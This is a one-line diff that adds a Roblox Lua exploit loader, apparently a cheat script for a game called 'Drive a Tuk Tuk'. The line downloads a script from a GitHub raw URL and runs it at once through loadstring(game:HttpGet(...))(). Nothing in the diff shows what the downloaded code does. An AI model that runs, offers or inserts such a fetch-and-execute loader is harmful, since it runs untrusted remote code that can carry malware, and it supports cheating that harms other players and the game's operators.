@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/drive-a-tuk-tuk-spam7-5jy94p8zgtb16u.lua"))()
